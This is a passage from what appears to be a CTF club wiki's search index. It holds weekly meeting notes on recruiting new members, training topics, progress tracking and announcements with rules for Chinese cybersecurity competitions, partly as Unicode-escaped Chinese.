<p>\u534a\u51b3\u8d5b\u548c\u603b\u51b3\u8d5b\u79ef\u5206\u6a21\u5f0f\u5982\u4e0b\uff1a</p> <p>\uff08\u53c2\u8003\u539f\u6587\uff09</p> <p>\u56db\u3001\u5176\u4ed6\u89c4\u5219</p> <ol> <li> <p>\u6bd4\u8d5b\u5f53\u5929\u6240\u6709\u53c2\u8d5b\u9009\u624b\u9700\u6301\u8eab\u4efd\u8bc1\u539f\u4ef6\u5230\u8fbe\u6bd4\u8d5b\u73b0\u573a\uff0c\u8fdf\u5230\u8d85\u534a\u5c0f\u65f6\u7981\u6b62\u5165\u573a\u3002</p> </li> <li> <p>\u88c1\u5224\u6709\u6743\u6839\u636e\u73b0\u573a\u60c5\u51b5\u5bf9\u8fdd\u89c4\u3001\u8fdd\u7eaa\u6218\u961f\u8fdb\u884c\u51cf\u5206\u5904\u7406\u3002</p> </li> <li> <p>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u8bf7\u968f\u65f6\u5173\u6ce8\u7b54\u9898\u9875\u9762\u7684\u516c\u544a\u680f\uff0c\u6240\u6709\u6267\u884c\u89c4\u5219\u53ca\u5224\u7f5a\u4ee5\u6700\u65b0\u516c\u544a\u4e3a\u51c6\u3002</p> </li> <li> <p>\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u5bf9\u5e73\u53f0\u6216\u9898\u76ee\u6709\u95ee\u9898\uff0c\u53ef\u4ee5\u5728\u7b54\u9898\u9875\u9762\u7aef\u70b9\u51fb\u201c\u547c\u53eb\u88c1\u5224\u201d\u6309\u94ae\u53cd\u9988\u95ee\u9898\uff0c\u8bf7\u63cf\u8ff0\u6e05\u695a\u9047\u5230\u7684\u95ee\u9898\uff0c\u5426\u5219\u53ef\u80fd\u5f71\u54cd\u5e94\u7b54\u6548\u7387\u3002\u7981\u6b62\u968f\u610f\u5728\u573a\u5185\u8d70\u52a8\u3002</p> </li> <li> <p>\u4e3a\u7ef4\u62a4\u73b0\u573a\u79e9\u5e8f\uff0c\u907f\u514d\u8de8\u6218\u961f\u4ea4\u6d41\uff0c\u53bb\u6d17\u624b\u95f4\u8bf7\u4e3e\u624b\u793a\u610f\uff0c\u7ecf\u8fc7\u5de5\u4f5c\u4eba\u5458\u786e\u8ba4\u540e\u53ef\u4ee5\u51ed\u7533\u8bf7\u4eba\u53c2\u8d5b\u8bc1\u4ece\u76f8\u5e94\u51fa\u53e3\u6709\u79e9\u5e8f\u53bb\u6d17\u624b\u95f4\u3002</p> </li> </ol> <p>\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u7ec4\u59d4\u4f1a</p> <p>2023\u5e743\u6708</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#0x2-new-member-recruitment","title":"0x2. New Member Recruitment","text":"<p>The recruitment pattern for new members this semester is</p> <ol> <li> <p>three-week online learning of basic content, with records, kept through Tencent meetings and video recording and used for future basic content review teaching.</p> </li> <li> <p>a two-day assessment session in the format of Jeopardy, which will be conducted using the COMPASS tournament platform.</p> </li> </ol> <p>The number of new members recruited this semester is about 5.</p> <p>The basics and tutorials are posted on our wiki page currently. More contents are under design.</p> <ul> <li>CTF Introduction and the Hacker Attitude</li> <li>Linux OS Installation and Basics</li> <li>Python Programming Quick Guide - Installation and Basic IO</li> <li>Python Programming Quick Guide - Syntax</li> <li>Python Programming Quick Guide - Functions</li> <li>Forensics</li> <li>Docker for beginners</li> </ul>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#0x3-competition-and-events","title":"0x3. Competition and Events","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_2","title":"\u6570\u5b57\u4e2d\u56fd\u00b7\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u89e3\u51b3\u65b9\u6848\u521b\u65b0\u8d5b\uff08\u521d\u8d5b\uff09","text":"<p>\u672c\u8d5b\u9053\u4ee5\u5207\u5b9e\u89e3\u6c7a\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u4e2d\u7684\u5b9e\u9645\u95ee\u9898\u4e3a\u76ee\u6807\uff0e\u6709\u529b\u63a8\u52a8\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\uff0c\u53d1\u6325\u6570\u636e\u5b89\u5168\u6280\u672f\u521b\u65b0\u3001\u6210\u679c\u8f6c\u5316\u3001\u4eba\u624d\u57f9\u517b\u7b49\u5178\u578b\u793a\u8303\u5e26\u52a8\u4f5c\u7528\u3001\u63a8\u5e7f\u4f18\u79c0\u7ecf\u9a8c\u548c\u6210\u679c\uff0c\u52a9\u529b\u6211\u56fd\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_3","title":"\u6bd4\u8d5b\u94fe\u63a5","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1ahttps://www.dcic-china.com/competitions/10078</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_4","title":"\u6bd4\u8d5b\u65f6\u95f4","text":"<p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2023-03-27 00:00:00 - 2023-04-07 00:00:00</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_5","title":"\u8d5b\u4e8b\u673a\u6784","text":"<p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u798f\u5efa\u7701\u901a\u4fe1\u7ba1\u7406\u5c40</p> <p>\u6307\u5bfc\u5355\u4f4d\uff1a\u6570\u5b57\u4e2d\u56fd\u5efa\u8bbe\u5cf0\u4f1a\u7ec4\u59d4\u4f1a</p> <p>\u627f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u7535\u5b50\u4fe1\u606f\u4ea7\u4e1a\u53d1\u5c55\u7814\u7a76\u9662\u3001\u4e2d\u56fd\u8f6f\u4ef6\u8bc4\u6d4b\u4e2d\u5fc3\u3001\u5de5\u4e1a\u548c\u4fe1\u606f\u5316\u90e8\u6559\u80b2\u4e0e\u8003\u8bd5\u4e2d\u5fc3</p> <p>\u534f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u8ba1\u7b97\u673a\u884c\u4e1a\u534f\u4f1a\u6570\u636e\u5b89\u5168\u4e13\u4e1a\u59d4\u5458\u4f1a\u3001\u5317\u4eac\u6c38\u4fe1\u81f3\u8bda\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8</p> <p>\u652f\u6301\u5355\u4f4d\uff1a\u8682\u8681\u96c6\u56e2\u3001\u4e2d\u5b5a\u4fe1\u606f\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001360\u6570\u5b57\u5b89\u5168\u79d1\u6280\u96c6\u56e2\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u957f\u4ead\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u817e\u8baf\u4e91\u8ba1\u7b97\uff08\u5317\u4eac\uff09\u6709\u9650\u8d23\u4efb\u516c\u53f8\u3001\u8fdc\u6c5f\u76db\u90a6\uff08\u5317\u4eac\uff09\u7f51\u7edc\u5b89\u5168\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u4f17\u5b89\u5929\u4e0b\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u65f6\u4ee3\u65b0\u5a01\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_6","title":"\u6bd4\u8d5b\u5f62\u5f0f","text":"<p>\u521b\u65b0\u8d5b\u91c7\u7528\u516c\u5f00\u5f0f\u7ade\u8d5b\uff0c\u56f4\u7ed5\u6570\u636e\u5b89\u5168\u6cbb\u7406\uff0c\u53c2\u8d5b\u5355\u4f4d\u63d0\u4ea4\u5b9e\u8df5\u6848\u4f8b\u3002\u8d5b\u4e8b\u5206\u9884\u8d5b\u548c\u51b3\u8d5b\u3002\u9884\u8d5b\u9636\u6bb5\u4e13\u5bb6\u7ec4\u8bc4\u59d4\u5c06\u91c7\u53d6\u8fdc\u7a0b\u767b\u5f55\u6216\u672c\u5730\u5b89\u88c5\u7684\u65b9\u5f0f\u8fd0\u884c\u53c2\u8d5b\u4f5c\u54c1\uff0c\u4f9d\u636e\u8d5b\u4e8b\u4e13\u5bb6\u5236\u5b9a\u7684\u6bd4\u8d5b\u8bc4\u5ba1\u6807\u51c6\u8fdb\u884c\u6253\u5206\uff0c\u6839\u636e\u5f97\u5206\u6392\u540d\u786e\u5b9a\u51b3\u8d5b\u540d\u5355\u3002\u51b3\u8d5b\u91c7\u7528\u7b54\u8fa9\u7684\u5f62\u5f0f\uff0c\u7531\u8d5b\u4e8b\u4e13\u5bb6\u7ec4\u5bf9\u9884\u8d5b\u5165\u56f4\u65b9\u6848\u8fdb\u884c\u8bc4\u5ba1\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_7","title":"\u6570\u5b57\u4e2d\u56fd\u00b7\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u4eba\u624d\u80fd\u529b\u6311\u6218\u8d5b\uff08\u521d\u8d5b\uff09","text":"<p>\u672c\u8d5b\u9053\u4ee5\u5207\u5b9e\u89e3\u6c7a\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u4e2d\u7684\u5b9e\u9645\u95ee\u9898\u4e3a\u76ee\u6807\uff0e\u6709\u529b\u63a8\u52a8\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\uff0c\u53d1\u6325\u6570\u636e\u5b89\u5168\u6280\u672f\u521b\u65b0\u3001\u6210\u679c\u8f6c\u5316\u3001\u4eba\u624d\u57f9\u517b\u7b49\u5178\u578b\u793a\u8303\u5e26\u52a8\u4f5c\u7528\u3001\u63a8\u5e7f\u4f18\u79c0\u7ecf\u9a8c\u548c\u6210\u679c\uff0c\u52a9\u529b\u6211\u56fd\u6570\u636e\u5b89\u5168\u4ea7\u4e1a\u53d1\u5c55\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_8","title":"\u6bd4\u8d5b\u94fe\u63a5","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1a\u6682\u65e0</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_9","title":"\u6bd4\u8d5b\u65f6\u95f4","text":"<p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2023-03-06 00:00:00 - 2023-03-22 00:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2023-04-01 00:00:00 - 2023-04-01 00:00:00</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_10","title":"\u8d5b\u4e8b\u673a\u6784","text":"<p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u798f\u5efa\u7701\u901a\u4fe1\u7ba1\u7406\u5c40</p> <p>\u6307\u5bfc\u5355\u4f4d\uff1a\u6570\u5b57\u4e2d\u56fd\u5efa\u8bbe\u5cf0\u4f1a\u7ec4\u59d4\u4f1a</p> <p>\u627f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u7535\u5b50\u4fe1\u606f\u4ea7\u4e1a\u53d1\u5c55\u7814\u7a76\u9662\u3001\u4e2d\u56fd\u8f6f\u4ef6\u8bc4\u6d4b\u4e2d\u5fc3\u3001\u5de5\u4e1a\u548c\u4fe1\u606f\u5316\u90e8\u6559\u80b2\u4e0e\u8003\u8bd5\u4e2d\u5fc3</p> <p>\u534f\u529e\u5355\u4f4d\uff1a\u4e2d\u56fd\u8ba1\u7b97\u673a\u884c\u4e1a\u534f\u4f1a\u6570\u636e\u5b89\u5168\u4e13\u4e1a\u59d4\u5458\u4f1a\u3001\u5317\u4eac\u6c38\u4fe1\u81f3\u8bda\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8</p> <p>\u652f\u6301\u5355\u4f4d\uff1a\u8682\u8681\u96c6\u56e2\u3001\u4e2d\u5b5a\u4fe1\u606f\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001360\u6570\u5b57\u5b89\u5168\u79d1\u6280\u96c6\u56e2\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u957f\u4ead\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u817e\u8baf\u4e91\u8ba1\u7b97\uff08\u5317\u4eac\uff09\u6709\u9650\u8d23\u4efb\u516c\u53f8\u3001\u8fdc\u6c5f\u76db\u90a6\uff08\u5317\u4eac\uff09\u7f51\u7edc\u5b89\u5168\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u4f17\u5b89\u5929\u4e0b\u79d1\u6280\u6709\u9650\u516c\u53f8\u3001\u5317\u4eac\u65f6\u4ee3\u65b0\u5a01\u4fe1\u606f\u6280\u672f\u6709\u9650\u516c\u53f8</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#_11","title":"\u6bd4\u8d5b\u5f62\u5f0f","text":"<p>\u7531\u7406\u8bba\u77e5\u8bc6\u548c\u6280\u80fd\u64cd\u4f5c\u4e24\u90e8\u5206\u7ec4\u6210\u3002\u7406\u8bba\u90e8\u5206\u6db5\u76d6\u653f\u7b56\u6cd5\u89c4\u548c\u6570\u636e\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\uff1b\u6280\u80fd\u64cd\u4f5c\u90e8\u5206\u6db5\u76d6\u6570\u636e\u8bc6\u522b\u3001\u6743\u9650\u63a7\u5236\u3001\u8106\u5f31\u6027\u5206\u6790\u7b49\u65b9\u5411\uff0c\u7efc\u5408\u8003\u5bdf\u53c2\u8d5b\u8005\u4e0d\u540c\u7ef4\u5ea6\u7684\u6570\u636e\u5b89\u5168\u80fd\u529b\u6c34\u5e73\u3002</p> <p>\u3010\u5b89\u6052\u4fe1\u606f\u3011\u4eb2\u7231\u7684\u53c2\u8d5b\u9009\u624b\uff0c\u60a8\u597d\uff01\u60a8\u62a5\u540d\u7684\u201c2023\u6570\u5b57\u4e2d\u56fd\u521b\u65b0\u5927\u8d5b-\u6570\u5b57\u7f51\u7edc\u5b89\u5168\u4eba\u624d\u6311\u6218\u8d5b\u201d\u5c06\u4e8e2023\u5e743\u670824\u65e5\u8fdb\u884c\uff0c\u8bf7\u60a8\u6309\u65f6\u53c2\u52a0\u3002 \u6bd4\u8d5b\u5730\u5740\uff1ahttps://szzg2023.dasctf.com \u6bd4\u8d5b\u8d26\u53f7\uff1aaq#\u62a5\u540d\u7684\u624b\u673a\u53f7\u540e\u4e03\u4f4d \u6bd4\u8d5b\u5bc6\u7801\uff1aDas#\u624b\u673a\u53f7\u540e\u56db\u4f4d\uff0c\u5982\uff1aDas#1234 \u6bd4\u8d5b\u65f6\u95f4\uff1a\u4e0b\u534813:00-17:00 \u6ce8\u610f\u4e8b\u9879\uff1a\u63a8\u8350\u4f7f\u7528Chrome\u6216\u706b\u72d0\u6d4f\u89c8\u5668\uff0c\u5e76\u8bbe\u7f6e\u5141\u8bb8\u5f39\u51fa\u7a97\u53e3\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-23/#wrap-up","title":"Wrap-up","text":"<p>Last week we officially started the recruitment program, and the program is going very well, we have more than 20 new students who are learning the basic content tutorials, and when the basic content teaching is completed, April 8 and 9 will be tested. We are also looking forward to the participation of the varsity students in this week's training, which will be an introduction to the Ether and Solidity languages (blockchain).</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/","title":"CTF Week Meeting 2023-03-30","text":"<p>I'm back from illness currently. Next month we are going to play Wangding Cup Semi-Final / Final in Hangzhou. We are also looking forward to the participation of the varsity students in this week's training, which will be an introduction to the Ether and Solidity languages (blockchain).</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 60%</li> <li>CTFtime program: play CTF and share - 23%</li> <li>New Member Recruitment - 50%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 63%</li> <li>CTF from Practice to Principle - 3%</li> <li>National College Student Information Security Contest - 20%</li> <li>Wangding Cup Semi-Final Competition - 50%</li> <li>Discussions with Other Universities about National College Student Information Software Competition - 5%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Exercise about the National Competition.</li> <li>Remedial content session.</li> <li>Competition and Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#0x1-national-college-student-information-security-contest","title":"0x1. National College Student Information Security Contest","text":"<p>http://117.78.33.202/</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_1","title":"\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\u8d5b","text":"<p>\u8d5b\u4e8b\u4ecb\u7ecd\uff1a</p> <p>\u4e3a\u79ef\u6781\u54cd\u5e94\u56fd\u5bb6\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u4eba\u624d\u6218\u7565\uff0c\u52a0\u5feb\u653b\u9632\u517c\u5907\u521b\u65b0\u4eba\u624d\u57f9\u517b\u6b65\u4f10\uff0c\u63d0\u5347\u5b66\u751f\u653b\u9632\u517c\u5907\u7684\u7f51\u7edc\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\uff0c\u57f9\u517b\u5b66\u751f\u7684\u521b\u65b0\u610f\u8bc6\u4e0e\u56e2\u961f\u5408\u4f5c\u7cbe\u795e\uff0c\u666e\u53ca\u4fe1\u606f\u5b89\u5168\u77e5\u8bc6\uff0c\u589e\u5f3a\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u610f\u8bc6\uff0c\u63d0\u9ad8\u5b66\u751f\u7684\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u521b\u65b0\u80fd\u529b\u4e0e\u5b9e\u8df5\u6280\u80fd\uff0c\u63a8\u52a8\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u751f\u6001\u4f53\u7cfb\u7684\u4eba\u624d\u57f9\u517b\u548c\u4ea7\u5b66\u7814\u7528\u3002\u7531\u5357\u5f00\u5927\u5b66\u627f\u529e\u7684\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u2014\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\u8d5b\uff08\u4ee5\u4e0b\u7b80\u79f0\u201c\u5927\u8d5b\"\uff09\u5c06\u4e8e2022\u5e744\u6708\u81f32022\u5e747\u6708\u4e3e\u884c\uff0c\u9762\u5411\u5168\u56fd\u9ad8\u6821\u5728\u6821\u751f\u5f00\u653e\u3002</p> <p>\u4e00\u3001\u5927\u8d5b\u7ec4\u7ec7\u5f62\u5f0f</p> <p>\u672c\u5c4a\u5927\u8d5b\u6309\u7167\u5728\u7ebf\u6ce8\u518c\u62a5\u540d\u7ec4\u961f\u3001\u7ebf\u4e0a\u521d\u8d5b\u9009\u62d4\u3001\u5206\u533a\u8d5b\u548c\u5168\u56fd\u603b\u51b3\u8d5b\u56db\u4e2a\u9636\u6bb5\u7ec4\u7ec7\u3002\u5168\u56fd\u8bbe\u7f6e\u516b\u5927\u8d5b\u533a\uff0c\u5404\u533a\u57df\u5185\u9ad8\u6821\u53c2\u8d5b\u56e2\u961f\u901a\u8fc7\u5206\u533a\u8d5b\u664b\u7ea7\u5168\u56fd\u603b\u51b3\u8d5b\u3002</p> <p>\u66f4\u591a\u5927\u8d5b\u5185\u5bb9\u548c\u5177\u4f53\u5b89\u6392\u8be6\u89c1\u300a\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u2014\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\u8d5b\u7ade\u8d5b\u89c4\u7a0b\u300b\uff0c\u5f00\u8d5b\u540e\u5c06\u901a\u8fc7\u5927\u8d5b\u5b98\u7f51\uff08http://www.ciscn.cn/\uff09\u516c\u5e03\u3002</p> <p>\u4e8c\u3001\u53c2\u8d5b\u5bf9\u8c61\u53ca\u8981\u6c42</p> <p>\u53c2\u8d5b\u5bf9\u8c61\u5e94\u4e3a\u5168\u56fd\u9ad8\u7b49\u5b66\u6821\uff08\u672c\u79d1\u7c7b\u548c\u9ad8\u804c\u9ad8\u4e13\u7c7b\u9662\u6821\uff09\u5177\u6709\u6b63\u89c4\u5b66\u7c4d\u7684\u5168\u65e5\u5236\u5728\u6821\u5927\u5b66\u751f\uff08\u5305\u62ec\u9ad8\u804c\u9ad8\u4e13\u3001\u672c\u79d1\u751f\u3001\u7814\u7a76\u751f\uff09\uff0c\u5177\u4f53\u8981\u6c42\u5982\u4e0b\uff1a</p> <p>1\uff09\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u4eba\u6570\u6700\u591a\u4e0d\u8d85\u8fc74\u4eba\uff0c\u5141\u8bb8\u6821\u5185\u8de8\u5e74\u7ea7\u3001\u8de8\u4e13\u4e1a\u7ec4\u961f\uff0c\u5404\u9ad8\u6821\u53c2\u8d5b\u961f\u6570\u4e0d\u9650\uff0c\u4e0d\u53ef\u8de8\u6821\u7ec4\u961f\uff1b</p> <p>2\uff09\u6bcf\u4eba\u53ea\u80fd\u53c2\u52a0\u4e00\u652f\u961f\u4f0d\uff08\u5373\u4e2a\u4eba\u53c2\u8d5b\u540e\u4e0d\u53ef\u518d\u4e0e\u4ed6\u4eba\u7ec4\u961f\u53c2\u8d5b\uff0c\u6216\u4e2a\u4eba\u53c2\u52a0\u4e00\u4e2a\u961f\u4f0d\u540e\u4e0d\u53ef\u518d\u53c2\u52a0\u53e6\u4e00\u4e2a\u961f\u4f0d\uff09\uff0c\u5141\u8bb8\u6709\u4e00\u540d\u6307\u5bfc\u8001\u5e08\uff1b</p> <p>3\uff09\u9ad8\u6821\u5206\u5e03\u5728\u4e0d\u540c\u57ce\u5e02\u7684\u6821\u533a\u89c6\u4e3a\u4e0d\u540c\u9ad8\u6821\uff0c\u5404\u6821\u533a\u53ef\u5206\u522b\u7ec4\u961f\u53c2\u8d5b\u5e76\u5165\u56f4\u5230\u6240\u5728\u5206\u533a\u7684\u5206\u533a\u51b3\u8d5b\uff0c\u4ee5\u53ca\u603b\u51b3\u8d5b\u9636\u6bb5\uff1b</p> <p>4\uff09\u6307\u5bfc\u6559\u5e08\u5fc5\u987b\u662f\u53c2\u8d5b\u961f\u4f0d\u6240\u5728\u9ad8\u6821\u5728\u804c\u6559\u5e08\u3002\u6307\u5bfc\u6559\u5e08\u53ef\u4ee5\u6307\u5bfc\u5b66\u751f\u8fdb\u884c\u7ec4\u961f\u3001\u77e5\u8bc6\u6280\u80fd\u8bad\u7ec3\uff0c\u4f46\u73b0\u573a\u53c2\u8d5b\u5fc5\u987b\u7531\u53c2\u8d5b\u5b66\u751f\u72ec\u7acb\u5b8c\u6210\uff1b</p> <p>6\uff09\u6307\u5bfc\u6559\u5e08\u8d1f\u8d23\u5168\u7a0b\u7ba1\u7406\u3001\u6307\u5bfc\u53c2\u8d5b\u7684\u5b66\u751f\u961f\u4f0d\uff0c\u53c2\u8d5b\u8fc7\u7a0b\u4e0d\u5f97\u8fdd\u53cd\u6bd4\u8d5b\u89c4\u5219\uff0c\u4e0d\u5bf9\u6bd4\u8d5b\u5e73\u53f0\u3001\u7cfb\u7edf\u548c\u7b2c\u4e09\u65b9\u670d\u52a1\u8fdb\u884c\u653b\u51fb\uff0c\u4e0d\u5f97\u4e0e\u56fd\u5bb6\u6cd5\u5f8b\u3001\u6cd5\u89c4\u3001\u516c\u5e8f\u826f\u4fd7\u76f8\u8fdd\u80cc\uff08\u5982\u961f\u540d\u7b49\uff09\uff1b\u7ec4\u59d4\u4f1a\u5c06\u8bc4\u9009\u4f18\u79c0\u6307\u5bfc\u6559\u5e08\uff08\u83b7\u5f97\u5168\u56fd\u4e00\u7b49\u5956\u53ca\u521b\u65b0\u5355\u9879\u5956\u56e2\u961f\u7684\u6307\u5bfc\u8001\u5e08\uff09\uff0c\u5e76\u4e88\u4ee5\u8868\u5f70\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-03-30/#_2","title":"\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b","text":"<p>\u8d5b\u4e8b\u4ecb\u7ecd\uff1a</p> <p>\u4e3a\u9009\u62d4\u3001\u63a8\u8350\u4f18\u79c0\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u4e13\u4e1a\u4eba\u624d\uff0c\u57f9\u517b\u5b66\u751f\u7684\u521b\u65b0\u610f\u8bc6\u4e0e\u56e2\u961f\u5408\u4f5c\u7cbe\u795e\uff0c\u63d0\u9ad8\u5b66\u751f\u7684\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6c34\u5e73\u3001\u521b\u65b0\u5b9e\u8df5\u4e0e\u7efc\u5408\u8bbe\u8ba1\u80fd\u529b\uff0c\u63a8\u52a8\u6211\u56fd\u9ad8\u6821\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u4e13\u4e1a\u5efa\u8bbe\u4e0e\u6539\u9769\uff0c\u7531\u6e56\u5357\u5927\u5b66\u627f\u529e\u7684\u201c\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u2014\u4f5c\u54c1\u8d5b\u201d\uff08\u4ee5\u4e0b\u7b80\u79f0\u201c\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b\u201d\uff09\uff0c\u5c06\u4e8e2022\u5e744\u6708\u81f32022\u5e748\u6708\u5728\u6e56\u5357\u957f\u6c99\u4e3e\u884c\u3002</p> <p>\u4e00\u3001\u672c\u5c4a\u7ade\u8d5b\u6d3b\u52a8\u5185\u5bb9</p> <p>1. \u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b</p> <p>\u672c\u6b21\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b\u91c7\u7528\u5f00\u653e\u5f0f\u81ea\u4e3b\u547d\u9898\uff0c\u81ea\u4e3b\u8bbe\u8ba1\uff0c\u53c2\u8d5b\u8005\u987b\u5728\u622a\u6b62\u65e5\u671f\u524d\u5b8c\u6210\u4f5c\u54c1\u5e76\u7f51\u4e0a\u63d0\u4ea4\u3002\u53c2\u8d5b\u4f5c\u54c1\u7684\u5185\u5bb9\u8981\u6c42\u7b26\u5408\u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u7ae0\u7a0b\u300b\u548c\u300a2022\u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u2014\u4f5c\u54c1\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\uff08\u5f00\u8d5b\u540e\u5c06\u901a\u8fc7\u5927\u8d5b\u5b98\u65b9\u7f51\u5740http://www.ciscn.cn/\u516c\u5e03\uff09\u4e2d\u7684\u76f8\u5173\u89c4\u5b9a\u3002</p> <p>2. \u7f51\u7edc\u5b89\u5168\u4eba\u624d\u521b\u65b0\u521b\u4e1a\u53d1\u5c55\u8bba\u575b</p> <p>\u5b89\u5168\u8bba\u575b\u5305\u542b\u591a\u4e2a\u4e3b\u9898\u677f\u5757\uff0c\u56f4\u7ed5\u5f53\u524d\u7f51\u5b89\u4ea7\u4e1a\u8d8b\u52bf\u4e0e\u6280\u672f\u70ed\u70b9\uff0c\u63a2\u8ba8\u7f51\u7edc\u5b89\u5168\u4eba\u624d\u57f9\u517b\u53ca\u5927\u5b66\u751f\u521b\u65b0\u521b\u4e1a\uff0c\u5f00\u5c55\u4e30\u5bcc\u591a\u5f69\u7684\u4e3b\u9898\u6f14\u8bb2\u4e0e\u5168\u65b9\u4f4d\u4e92\u52a8\u3002</p> <p>\u4e8c\u3001\u53c2\u8d5b\u5bf9\u8c61</p> <p>\u53c2\u8d5b\u5bf9\u8c61\u4e3a\u5168\u56fd\u5177\u6709\u6b63\u5f0f\u5b66\u7c4d\u7684\u5168\u65e5\u5236\u5728\u6821\u5927\u5b66\u751f\u3002\u5b66\u751f\u53ef\u81ea\u884c\u7ec4\u961f\u53c2\u52a0\uff0c\u6bcf\u652f\u53c2\u8d5b\u961f\u4e0d\u8d85\u8fc74\u540d\u5b66\u751f\uff08\u5305\u62ec1\u540d\u7ec4\u957f\uff09\u3002\u6bcf\u652f\u53c2\u8d5b\u961f\u9650\u6307\u5b9a1\u540d\u6307\u5bfc\u6559\u5e08\uff0c\u6bcf\u540d\u5b66\u751f\u9650\u53c2\u52a01\u652f\u53c2\u8d5b\u961f\u3002\u5404\u9ad8\u6821\u53c2\u8d5b\u961f\u6570\u4e0d\u9650\uff0c\u4e0d\u5141\u8bb8\u8de8\u6821\u7ec4\u961f\u3002</p> 